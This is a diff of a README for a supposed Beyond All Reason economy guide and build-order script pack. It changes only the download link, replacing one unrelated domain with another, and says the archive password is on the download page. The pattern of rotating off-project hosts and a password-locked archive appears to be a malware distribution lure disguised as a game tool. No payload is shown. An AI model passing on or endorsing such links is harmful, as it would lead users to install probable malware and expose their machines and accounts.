@@ -18,7 +18,7 @@ In-depth economy guide for Beyond All Reason with build-order scripts, metal ext
 
 ## Download
 
-[![Download v2026.1](https://img.shields.io/badge/Download_v2026.1-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/bareconomy)
+[![Download v2026.1](https://img.shields.io/badge/Download_v2026.1-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/bareconomy)
 
 > The archive password is shown on the download page.
 
